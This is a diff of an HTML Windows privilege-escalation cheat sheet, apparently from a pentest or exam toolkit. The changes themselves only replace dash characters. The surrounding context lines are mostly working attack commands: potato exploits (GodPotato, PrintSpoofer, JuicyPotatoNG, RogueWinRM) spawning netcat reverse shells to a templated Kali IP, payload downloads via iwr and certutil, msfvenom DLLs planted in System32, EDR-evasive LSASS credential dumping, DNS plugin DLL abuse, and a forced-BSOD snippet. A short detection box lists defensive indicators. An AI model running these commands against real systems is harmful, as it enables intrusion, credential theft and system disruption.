@@ -1036,7 +1036,7 @@ whoami /priv | findstr /i "Se"</div>
 
       <!-- FullPowers step 0 -->
       <div class="section">
-        <div class="section-header">&#9888; STEP 0 &mdash; FullPowers (Run FIRST if LOCAL/NETWORK SERVICE)</div>
+        <div class="section-header">&#9888; STEP 0  -  FullPowers (Run FIRST if LOCAL/NETWORK SERVICE)</div>
         <div class="section-body">
           <div class="alert alert-red">
             <span class="alert-icon">!</span>
@@ -1082,7 +1082,7 @@ REM Extended privilege set (may fail on NETWORK SERVICE):
 
       <!-- POTATO DECISION TREE -->
       <div class="section">
-        <div class="section-header">&#128506; POTATO DECISION TREE &mdash; Pick the Right Tool</div>
+        <div class="section-header">&#128506; POTATO DECISION TREE  -  Pick the Right Tool</div>
         <div class="section-body">
           <div class="flow-chain">
             <div class="flow-node">Check OS Build</div><div class="flow-arrow">&rarr;</div>
@@ -1094,7 +1094,7 @@ REM Extended privilege set (may fail on NETWORK SERVICE):
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win XP / Server 2003 (build &lt;6000)</span> &rarr; <span style="color:#a8ff78;">churrasco.exe</span></div>
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win7 SP1 (7601) / Server 2008 R2</span> &rarr; <span style="color:#a8ff78;">JuicyPotato</span> (original) or <span style="color:#a8ff78;">MSFRottenPotato</span></div>
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Server 2012 / Win8 &rarr; Server 2012 R2 (9600)</span> &rarr; <span style="color:#a8ff78;">GodPotato-NET4</span> or <span style="color:#a8ff78;">JuicyPotatoNG</span></div>
-            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win10 (15063&ndash;19041) / Server 2016&ndash;2019 (14393&ndash;17763)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> (best) OR <span style="color:#a8ff78;">PrintSpoofer</span> (Spooler must run)</div>
+            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win10 (15063-19041) / Server 2016-2019 (14393-17763)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> (best) OR <span style="color:#a8ff78;">PrintSpoofer</span> (Spooler must run)</div>
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win10 20H2+ / Server 2019+ (17763+)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> | <span style="color:#a8ff78;">JuicyPotatoNG</span> fallback</div>
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win11 / Server 2022 (build 22000+)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> OR <span style="color:#a8ff78;">SigmaPotato</span></div>
             <div style="margin-bottom:6px;"><span style="color:#ffd700;font-weight:bold;">Spooler OFF?</span> &rarr; <span style="color:#a8ff78;">SigmaPotato</span> OR <span style="color:#a8ff78;">SweetPotato -e EfsRpc</span> OR <span style="color:#a8ff78;">SharpEfsPotato</span></div>
@@ -1122,7 +1122,7 @@ REM .NET 4.x -&gt; GodPotato-NET4.exe (try first) | .NET 3.5 -&gt; NET35 | .NET 
 
       <!-- GodPotato -->
       <div class="section">
-        <div class="section-header">&#9889; GodPotato &mdash; Best All-Round (Server 2012&ndash;2022, Win8&ndash;11)</div>
+        <div class="section-header">&#9889; GodPotato  -  Best All-Round (Server 2012-2022, Win8-11)</div>
         <div class="section-body">
           <div class="flow-chain">
             <div class="flow-node">SeImpersonate</div><div class="flow-arrow">&rarr;</div>
@@ -1134,7 +1134,7 @@ REM .NET 4.x -&gt; GodPotato-NET4.exe (try first) | .NET 3.5 -&gt; NET35 | .NET 
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Transfer GodPotato &mdash; select correct .NET variant</div>
+              <div class="step-title">Transfer GodPotato  -  select correct .NET variant</div>
               <div class="code-block purple">REM NET4 -- try this first:
 iwr http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET4.exe -o {{WPATH}}\gp.exe
 REM NET35 fallback:
@@ -1146,14 +1146,14 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET2.exe -o {{WPATH}}\gp.exe</
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Verify &mdash; test with whoami</div>
+              <div class="step-title">Verify  -  test with whoami</div>
               <div class="code-block">.\gp.exe -cmd "cmd /c whoami"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Execute &mdash; reverse shell</div>
+              <div class="step-title">Execute  -  reverse shell</div>
               <div class="code-block green">.\gp.exe -cmd "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM Optional named pipe override:
 .\gp.exe -cmd "cmd /c whoami" -pipe "mypipe"</div>
@@ -1172,7 +1172,7 @@ REM Optional named pipe override:
 
       <!-- PrintSpoofer -->
       <div class="section">
-        <div class="section-header">&#128424; PrintSpoofer &mdash; Win10 / Server 2016/2019 (Spooler must be running)</div>
+        <div class="section-header">&#128424; PrintSpoofer  -  Win10 / Server 2016/2019 (Spooler must be running)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -1214,7 +1214,7 @@ REM Non-interactive reverse shell:
 
       <!-- JuicyPotatoNG -->
       <div class="section">
-        <div class="section-header">&#129349; JuicyPotatoNG &mdash; Server 2019+ / Win10 20H2+</div>
+        <div class="section-header">&#129349; JuicyPotatoNG  -  Server 2019+ / Win10 20H2+</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -1226,7 +1226,7 @@ REM Non-interactive reverse shell:
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Execute &mdash; try both token methods</div>
+              <div class="step-title">Execute  -  try both token methods</div>
               <div class="code-block green">.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM -t * tries CreateProcessWithTokenW AND CreateProcessAsUser
 REM Specify COM port if 10247 is in use:
@@ -1248,7 +1248,7 @@ REM Bruteforce CLSIDs if default fails:
 
       <!-- SigmaPotato -->
       <div class="section">
-        <div class="section-header">&#128314; SigmaPotato &mdash; Win8&ndash;11 / Server 2012&ndash;2022 (No Spooler needed)</div>
+        <div class="section-header">&#128314; SigmaPotato  -  Win8-11 / Server 2012-2022 (No Spooler needed)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -1281,7 +1281,7 @@ REM Built-in reverse shell:
           </div>
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
-            <span>No Spooler dependency. Tested Win8&ndash;Win11 and Server 2012&ndash;2022. SigmaPotatoCore.exe required for PS Core / .NET Core reflection (target needs .NET Framework 3.5).</span>
+            <span>No Spooler dependency. Tested Win8-Win11 and Server 2012-2022. SigmaPotatoCore.exe required for PS Core / .NET Core reflection (target needs .NET Framework 3.5).</span>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">&#128279;</span>
@@ -1292,7 +1292,7 @@ REM Built-in reverse shell:
 
       <!-- SweetPotato -->
       <div class="section">
-        <div class="section-header">&#127851; SweetPotato &mdash; EfsRpc / DCOM / PrintSpoofer Modes (Win7&ndash;Server 2019)</div>
+        <div class="section-header">&#127851; SweetPotato  -  EfsRpc / DCOM / PrintSpoofer Modes (Win7-Server 2019)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -1304,7 +1304,7 @@ REM Built-in reverse shell:
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Execute &mdash; EfsRpc mode (no Spooler needed)</div>
+              <div class="step-title">Execute  -  EfsRpc mode (no Spooler needed)</div>
               <div class="code-block green">.\sweet.exe -e EfsRpc -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
@@ -1331,7 +1331,7 @@ REM PrintSpoofer mode (default; Spooler required):
 
       <!-- SharpEfsPotato -->
       <div class="section">
-        <div class="section-header">&#128273; SharpEfsPotato &mdash; EfsRpc / PetitPotam (No Spooler required)</div>
+        <div class="section-header">&#128273; SharpEfsPotato  -  EfsRpc / PetitPotam (No Spooler required)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -1350,7 +1350,7 @@ REM PrintSpoofer mode (default; Spooler required):
           </div>
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
-            <span><strong>Flags:</strong> <code>-p &lt;prog&gt;</code> program (default: cmd.exe) | <code>-a &lt;args&gt;</code> arguments. Uses EfsRpcEncryptFileSrv &mdash; no Print Spooler dependency.</span>
+            <span><strong>Flags:</strong> <code>-p &lt;prog&gt;</code> program (default: cmd.exe) | <code>-a &lt;args&gt;</code> arguments. Uses EfsRpcEncryptFileSrv  -  no Print Spooler dependency.</span>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">&#128279;</span>
@@ -1361,7 +1361,7 @@ REM PrintSpoofer mode (default; Spooler required):
 
       <!-- RoguePotato -->
       <div class="section">
-        <div class="section-header">&#127744; RoguePotato &mdash; Requires socat Redirector on Kali</div>
+        <div class="section-header">&#127744; RoguePotato  -  Requires socat Redirector on Kali</div>
         <div class="section-body">
           <div class="alert alert-red">
             <span class="alert-icon">!</span>
@@ -1370,14 +1370,14 @@ REM PrintSpoofer mode (default; Spooler required):
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Kali &mdash; Start socat redirector (port 135 &rarr; 9999)</div>
+              <div class="step-title">Kali  -  Start socat redirector (port 135 &rarr; 9999)</div>
               <div class="code-block purple">sudo socat tcp-listen:135,reuseaddr,fork tcp:{{KALI_IP}}:9999</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Kali &mdash; Start reverse shell listener</div>
+              <div class="step-title">Kali  -  Start reverse shell listener</div>
               <div class="code-block purple">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
@@ -1410,16 +1410,16 @@ REM Randomize pipe name (stealth):
 
       <!-- churrasco -->
       <div class="section">
-        <div class="section-header">&#127830; churrasco.exe &mdash; Windows XP / Server 2003 (Token Kidnapping) <a href="https://github.com/Re4son/Churrasco" target="_blank" style="font-size:11px;color:var(--teal);font-weight:400;margin-left:8px">&#8599; github.com/Re4son/Churrasco</a></div>
+        <div class="section-header">&#127830; churrasco.exe  -  Windows XP / Server 2003 (Token Kidnapping) <a href="https://github.com/Re4son/Churrasco" target="_blank" style="font-size:11px;color:var(--teal);font-weight:400;margin-left:8px">&#8599; github.com/Re4son/Churrasco</a></div>
         <div class="section-body">
           <div class="alert alert-red">
             <span class="alert-icon">!</span>
-            <span>Legacy only &mdash; use on Windows XP / Server 2003 when modern potatoes fail. Requires NETWORK SERVICE or LOCAL SERVICE context. Kidnaps RPCSS process token.</span>
+            <span>Legacy only  -  use on Windows XP / Server 2003 when modern potatoes fail. Requires NETWORK SERVICE or LOCAL SERVICE context. Kidnaps RPCSS process token.</span>
           </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Transfer churrasco (certutil &mdash; no PowerShell on XP/2003)</div>
+              <div class="step-title">Transfer churrasco (certutil  -  no PowerShell on XP/2003)</div>
               <div class="code-block purple">certutil -urlcache -f http://{{KALI_IP}}:{{PORT}}/windows/churrasco.exe {{WPATH}}\churrasco.exe
 certutil -urlcache -f http://{{KALI_IP}}:{{PORT}}/windows/nc.exe {{WPATH}}\nc.exe</div>
             </div>
@@ -1436,23 +1436,23 @@ REM Add admin user:
           </div>
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
-            <span><strong>Usage:</strong> <code>churrasco.exe [-d] "command"</code> &mdash; <code>-d</code> optional debug. Works via RPCSS token kidnapping. Use nc.exe (not nc64.exe) on XP/2003.</span>
+            <span><strong>Usage:</strong> <code>churrasco.exe [-d] "command"</code>  -  <code>-d</code> optional debug. Works via RPCSS token kidnapping. Use nc.exe (not nc64.exe) on XP/2003.</span>
           </div>
         </div>
       </div>
 
       <!-- LocalPotato -->
       <div class="section">
-        <div class="section-header">&#129364; LocalPotato (CVE-2023-21746) &mdash; NTLM Reflection, File Write Primitive</div>
+        <div class="section-header">&#129364; LocalPotato (CVE-2023-21746)  -  NTLM Reflection, File Write Primitive</div>
         <div class="section-body">
           <div class="alert alert-red">
             <span class="alert-icon">!</span>
-            <span><strong>Different mechanism &mdash; NOT standard token impersonation.</strong> LocalPotato uses local NTLM reflection for arbitrary file write as SYSTEM. SMB scenario patched Jan 2023 (KB5022282). HTTP/WebDAV variant unpatched as of early 2024. Combine with DLL hijack for code execution.</span>
+            <span><strong>Different mechanism  -  NOT standard token impersonation.</strong> LocalPotato uses local NTLM reflection for arbitrary file write as SYSTEM. SMB scenario patched Jan 2023 (KB5022282). HTTP/WebDAV variant unpatched as of early 2024. Combine with DLL hijack for code execution.</span>
           </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">SMB mode &mdash; arbitrary file write as SYSTEM (patched, for unpatched targets only)</div>
+              <div class="step-title">SMB mode  -  arbitrary file write as SYSTEM (patched, for unpatched targets only)</div>
               <div class="code-block orange">LocalPotato.exe -i C:\Users\Public\evil.dll -o windows\system32\evil.dll
 REM -i source file | -o destination (no drive letter, relative to C:\)</div>
             </div>
@@ -1460,7 +1460,7 @@ REM -i source file | -o destination (no drive letter, relative to C:\)</div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">HTTP/WebDAV mode &mdash; unpatched</div>
+              <div class="step-title">HTTP/WebDAV mode  -  unpatched</div>
               <div class="code-block orange">LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local</div>
             </div>
           </div>
@@ -1477,11 +1477,11 @@ REM -i source file | -o destination (no drive letter, relative to C:\)</div>
 
       <!-- RemotePotato0 -->
       <div class="section">
-        <div class="section-header">&#128249; RemotePotato0 &mdash; Cross-Session DCOM Token Steal (antonioCoco)</div>
+        <div class="section-header">&#128249; RemotePotato0  -  Cross-Session DCOM Token Steal (antonioCoco)</div>
         <div class="section-body">
           <div class="alert alert-red">
             <span class="alert-icon">!</span>
-            <span><strong>Requires two conditions:</strong> (1) A high-privileged user (e.g. admin/SYSTEM) is logged into a different session on the same machine. (2) You can run a NTLM relay on Kali (impacket-ntlmrelayx). Works on Win7&ndash;Win10/Server 2019 - not patched in the standard Potato mitigations.</span>
+            <span><strong>Requires two conditions:</strong> (1) A high-privileged user (e.g. admin/SYSTEM) is logged into a different session on the same machine. (2) You can run a NTLM relay on Kali (impacket-ntlmrelayx). Works on Win7-Win10/Server 2019 - not patched in the standard Potato mitigations.</span>
           </div>
           <div class="flow-chain">
             <div class="flow-node">SeImpersonate</div><div class="flow-arrow">&rarr;</div>
@@ -1494,7 +1494,7 @@ REM -i source file | -o destination (no drive letter, relative to C:\)</div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Kali &mdash; Start NTLM relay listener (relay to LDAP or SMB of DC)</div>
+              <div class="step-title">Kali  -  Start NTLM relay listener (relay to LDAP or SMB of DC)</div>
               <div class="code-block purple">sudo impacket-ntlmrelayx -t ldap://{{TARGET}} --no-wcf-server --escalate-user {{USER}}
 REM Alternative: relay to SMB if you want a shell
 sudo impacket-ntlmrelayx -t smb://{{TARGET}} -socks</div>
@@ -1522,7 +1522,7 @@ query user</div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">Kali &mdash; Start socat redirector (RemotePotato0 needs port redirect on Kali)</div>
+              <div class="step-title">Kali  -  Start socat redirector (RemotePotato0 needs port redirect on Kali)</div>
               <div class="code-block purple">sudo socat TCP-LISTEN:9999,fork,reuseaddr TCP:127.0.0.1:9999 &amp;</div>
             </div>
           </div>
@@ -1548,7 +1548,7 @@ REM SMB relay: hash capture for cracking (hashcat -m 5600) or PTH</div>
 
       <!-- RogueWinRM -->
       <div class="section">
-        <div class="section-header">&#128329; RogueWinRM &mdash; Port 5985 Race (WinRM must be disabled on target)</div>
+        <div class="section-header">&#128329; RogueWinRM  -  Port 5985 Race (WinRM must be disabled on target)</div>
         <div class="section-body">
           <div class="alert alert-red">
             <span class="alert-icon">!</span>
@@ -1580,7 +1580,7 @@ REM If RUNNING/LISTEN on 5985 -- this technique WILL NOT WORK; use a potato inst
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">Run RogueWinRM on target &mdash; will listen on 5985 and run command as SYSTEM</div>
+              <div class="step-title">Run RogueWinRM on target  -  will listen on 5985 and run command as SYSTEM</div>
               <div class="code-block green">REM Non-interactive reverse shell:
 .\RogueWinRM.exe -p "{{WPATH}}\nc64.exe" -a "{{KALI_IP}} {{RPORT}} -e cmd"
 REM Interactive (spawns cmd in current console, requires SeImpersonate):
@@ -1848,17 +1848,17 @@ Get-Item "C:\Windows\System32\wbem\tzres.dll" | Select-Object Length,LastWriteTi
 
       <!-- ALTERNATIVE 4: wbemcomn.dll + WMI trigger (wmiprvse.exe) -->
       <div class="section">
-        <div class="section-header">&#128260; Alternative 4 &mdash; wbemcomn.dll + WMI trigger (wmiprvse.exe loads it)</div>
+        <div class="section-header">&#128260; Alternative 4  -  wbemcomn.dll + WMI trigger (wmiprvse.exe loads it)</div>
         <div class="section-body">
           <div class="alert alert-gold"><span class="alert-icon">&#9733;</span><span><strong>wbemcomn.dll</strong> is a WMI component loaded by <strong>wmiprvse.exe</strong> (WMI Provider Host). Drop it into <code>C:\Windows\System32\</code>, then trigger any WMI call - <code>systeminfo</code>, <code>Get-WmiObject</code>, or <code>sc query</code> will all cause wmiprvse.exe to load your DLL as SYSTEM. <strong>This has NOTHING to do with iphlpsvc</strong> - that was an earlier documentation error.</span></div>
           <div class="step"><div class="step-num">1</div><div class="step-content">
-            <div class="step-title">Kali &mdash; generate wbemcomn.dll</div>
+            <div class="step-title">Kali  -  generate wbemcomn.dll</div>
             <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o wbemcomn.dll
 cp wbemcomn.dll ~/privesc-toolkit/windows/wbemcomn.dll  # Place in http server windows/ dir
 python3 -m http.server {{PORT}}</div>
           </div></div>
           <div class="step"><div class="step-num">2</div><div class="step-content">
-            <div class="step-title">Kali &mdash; start reverse shell handler first (DLL may trigger immediately on drop)</div>
+            <div class="step-title">Kali  -  start reverse shell handler first (DLL may trigger immediately on drop)</div>
             <div class="code-block green">msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {{RPORT}}; run"</div>
           </div></div>
           <div class="step">
@@ -1870,11 +1870,11 @@ REM NOTE: wbemcomn.dll ALWAYS exists - this is a real system file. Backup is MAN
             </div>
           </div>
           <div class="step"><div class="step-num">3</div><div class="step-content">
-            <div class="step-title">Windows &mdash; drop the DLL into System32 (requires C:\ write from SeManageVolumeExploit)</div>
+            <div class="step-title">Windows  -  drop the DLL into System32 (requires C:\ write from SeManageVolumeExploit)</div>
             <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/wbemcomn.dll -OutFile "C:\Windows\System32\wbemcomn.dll"</div>
           </div></div>
           <div class="step"><div class="step-num">4</div><div class="step-content">
-            <div class="step-title">Windows &mdash; trigger WMI to load the DLL (wmiprvse.exe runs as SYSTEM)</div>
+            <div class="step-title">Windows  -  trigger WMI to load the DLL (wmiprvse.exe runs as SYSTEM)</div>
             <div class="code-block purple">REM Any of these will trigger wmiprvse.exe to load wbemcomn.dll:
 systeminfo
 REM Or:
@@ -2168,7 +2168,7 @@ mimikatz # sekurlsa::logonpasswords full</div>
 
       <!-- Vector 5: Advanced / Fileless -->
       <div class="section">
-        <div class="section-header">&#9889; Vector 5 &mdash; Fileless / EDR-Evasive Methods (Nanodump, NativeDump)</div>
+        <div class="section-header">&#9889; Vector 5  -  Fileless / EDR-Evasive Methods (Nanodump, NativeDump)</div>
         <div class="section-body">
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
@@ -2177,7 +2177,7 @@ mimikatz # sekurlsa::logonpasswords full</div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Nanodump (fortra) &mdash; indirect syscalls, --silent-process-exit mode</div>
+              <div class="step-title">Nanodump (fortra)  -  indirect syscalls, --silent-process-exit mode</div>
               <div class="code-block purple">REM Transfer nanodump:
 iwr http://{{KALI_IP}}:{{PORT}}/windows/nanodump.exe -o {{WPATH}}\nd.exe
 REM Standard dump (avoids MiniDumpWriteDump via indirect syscalls):
@@ -2191,7 +2191,7 @@ python3 -c "import base64" REM  then: mimikatz sekurlsa::minidump lsass.dmp</div
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">NativeDump (ricardojoserf) &mdash; NTAPI-only, hand-crafted minidump, no MiniDumpWriteDump</div>
+              <div class="step-title">NativeDump (ricardojoserf)  -  NTAPI-only, hand-crafted minidump, no MiniDumpWriteDump</div>
               <div class="code-block purple">REM Transfer NativeDump:
 iwr http://{{KALI_IP}}:{{PORT}}/windows/NativeDump.exe -o {{WPATH}}\nd2.exe
 REM Dump LSASS using only native APIs (NtReadVirtualMemory, NtQuerySystemInformation):
@@ -2203,7 +2203,7 @@ REM Parse on Kali: pypykatz lsa minidump lsass.dmp</div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">SafetyKatz &mdash; in-memory Mimikatz (no disk write)</div>
+              <div class="step-title">SafetyKatz  -  in-memory Mimikatz (no disk write)</div>
               <div class="code-block purple">REM Load Mimikatz reflectively in memory via .NET - no PE on disk:
 iwr http://{{KALI_IP}}:{{PORT}}/windows/SafetyKatz.exe -o {{WPATH}}\sk.exe
 .\sk.exe "sekurlsa::logonpasswords" "exit"
@@ -2229,7 +2229,7 @@ mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"</d
 
       <div class="detection-box">
         <div class="detection-title">&#128269; Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4656 &mdash; handle to lsass.exe with access mask 0x1FFFFF &bull; procdump.exe or rundll32+comsvcs.dll reading lsass memory &bull; Sysmon Event 10 &mdash; process access on lsass.exe by non-SYSTEM/non-WerFault process &bull; .dmp file created in Temp directories &bull; Event 4672 SeDebugPrivilege assigned to new logon &bull; Indirect syscall patterns (nanodump) &bull; NtReadVirtualMemory called on lsass.exe by unexpected process (NativeDump)</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4656  -  handle to lsass.exe with access mask 0x1FFFFF &bull; procdump.exe or rundll32+comsvcs.dll reading lsass memory &bull; Sysmon Event 10  -  process access on lsass.exe by non-SYSTEM/non-WerFault process &bull; .dmp file created in Temp directories &bull; Event 4672 SeDebugPrivilege assigned to new logon &bull; Indirect syscall patterns (nanodump) &bull; NtReadVirtualMemory called on lsass.exe by unexpected process (NativeDump)</div>
       </div>
     </div>
 
@@ -2740,11 +2740,11 @@ reg save HKLM\SYSTEM {{WPATH}}\\system
       </div>
 
       <div class="section">
-        <div class="section-header">&#9889; Method 4 &mdash; Service Binary Replacement (SYSTEM without RDP)</div>
+        <div class="section-header">&#9889; Method 4  -  Service Binary Replacement (SYSTEM without RDP)</div>
         <div class="section-body">
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
-            <span>When no RDP access is available (Methods 1&ndash;3 need lock screen), target a SYSTEM service binary instead. Take ownership, grant write, replace the binary with your payload, restart the service.</span>
+            <span>When no RDP access is available (Methods 1-3 need lock screen), target a SYSTEM service binary instead. Take ownership, grant write, replace the binary with your payload, restart the service.</span>
           </div>
           <div class="step">
             <div class="step-num">1</div>
@@ -2885,7 +2885,7 @@ REM NOTE: Windows 10 1803+ forbids NTLoadDriver from HKCU - the key is under HKL
 
       <!-- Legacy: Capcom -->
       <div class="section">
-        <div class="section-header">&#9889; Vector 2 &mdash; EOPLOADDRIVER + Capcom.sys + ExploitCapcom (LEGACY &mdash; blocked on modern Windows)</div>
+        <div class="section-header">&#9889; Vector 2  -  EOPLOADDRIVER + Capcom.sys + ExploitCapcom (LEGACY  -  blocked on modern Windows)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">0</div>
@@ -3035,7 +3035,7 @@ REM HKLM - driver was loaded under HKLM\System\CurrentControlSet\Services\ (not 
 
       <!-- PsBits alternative -->
       <div class="section">
-        <div class="section-header">&#9889; Alternative &mdash; PsBits (gtworek/PSBits) &mdash; S4U Token via SeTcbPrivilege</div>
+        <div class="section-header">&#9889; Alternative  -  PsBits (gtworek/PSBits)  -  S4U Token via SeTcbPrivilege</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -3369,7 +3369,7 @@ cmd /c mklink "C:\Python39\version.dll" "{{WPATH}}\\evil.dll"
         <div class="info-card"><div class="info-label">Result</div><div class="info-value">SYSTEM shell or persistent firmware implant</div></div>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Attack 1 &mdash; sysprep.exe DLL Hijack (SYSTEM via auto-elevated process)</div>
+        <div class="section-header">&#9889; Attack 1  -  sysprep.exe DLL Hijack (SYSTEM via auto-elevated process)</div>
         <div class="section-body">
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
@@ -3433,7 +3433,7 @@ copy /Y "{{WPATH}}\cryptbase.dll.bak" "C:\Windows\System32\Sysprep\cryptbase.dll
         </div>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Attack 2 &mdash; Firmware Variable Abuse (persistence / UEFI-level)</div>
+        <div class="section-header">&#9889; Attack 2  -  Firmware Variable Abuse (persistence / UEFI-level)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
@@ -3504,16 +3504,16 @@ REM Forces current user session logoff - services not restarted</div>
         </div>
       </div>
       <div class="section">
-        <div class="section-header">&#9889; Alternative &mdash; NtRaiseHardError BSOD (force crash without shutdown.exe)</div>
+        <div class="section-header">&#9889; Alternative  -  NtRaiseHardError BSOD (force crash without shutdown.exe)</div>
         <div class="section-body">
           <div class="alert alert-red">
             <span class="alert-icon">!</span>
-            <span><strong>Destructive &mdash; causes immediate BSOD/crash.</strong> SeShutdownPrivilege is not strictly required for NtRaiseHardError from user mode, but the combination confirms shutdown-level rights. Use only when a crash/reboot is intentional (e.g. triggering a service at next boot that runs your payload).</span>
+            <span><strong>Destructive  -  causes immediate BSOD/crash.</strong> SeShutdownPrivilege is not strictly required for NtRaiseHardError from user mode, but the combination confirms shutdown-level rights. Use only when a crash/reboot is intentional (e.g. triggering a service at next boot that runs your payload).</span>
           </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">PowerShell &mdash; force BSOD via NtRaiseHardError syscall</div>
+              <div class="step-title">PowerShell  -  force BSOD via NtRaiseHardError syscall</div>
               <div class="code-block orange">$def = @"
 using System;using System.Runtime.InteropServices;
 public class Crash {
@@ -3573,7 +3573,7 @@ $r = 0
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">JuicyPotatoNG &mdash; if ONLY SeAssignPrimaryToken (no SeImpersonate), use -t u</div>
+              <div class="step-title">JuicyPotatoNG  -  if ONLY SeAssignPrimaryToken (no SeImpersonate), use -t u</div>
               <div class="code-block green">REM Both privileges present (normal case):
 .\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM SeAssignPrimaryToken ONLY (no SeImpersonate) -- force CreateProcessAsUser:
@@ -3590,7 +3590,7 @@ REM SeAssignPrimaryToken ONLY (no SeImpersonate) -- force CreateProcessAsUser:
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">SigmaPotato (no Spooler; Win8&ndash;Win11 / Server 2012&ndash;2022)</div>
+              <div class="step-title">SigmaPotato (no Spooler; Win8-Win11 / Server 2012-2022)</div>
               <div class="code-block green">.\SigmaPotato.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
@@ -3604,7 +3604,7 @@ REM SeAssignPrimaryToken ONLY (no SeImpersonate) -- force CreateProcessAsUser:
           <div class="step">
             <div class="step-num">6</div>
             <div class="step-content">
-              <div class="step-title">FullPowers (if LOCAL/NETWORK SERVICE &mdash; run first)</div>
+              <div class="step-title">FullPowers (if LOCAL/NETWORK SERVICE  -  run first)</div>
               <div class="code-block green">.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z</div>
             </div>
           </div>
@@ -3808,7 +3808,7 @@ Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters -Name Se
           <div class="step">
             <div class="step-num">5a</div>
             <div class="step-content">
-              <div class="step-title">If ALREADY ON THE DC &mdash; use local hostname or omit entirely</div>
+              <div class="step-title">If ALREADY ON THE DC  -  use local hostname or omit entirely</div>
               <div class="code-block purple">REM You are on the DC itself - no hostname needed (or use "." or local hostname):
 dnscmd . /config /serverlevelplugindll \\{{KALI_IP}}\share\evil.dll
 REM Or use the DC's own computername:
@@ -4253,7 +4253,7 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -OutFile {{WPATH}}\\Ex
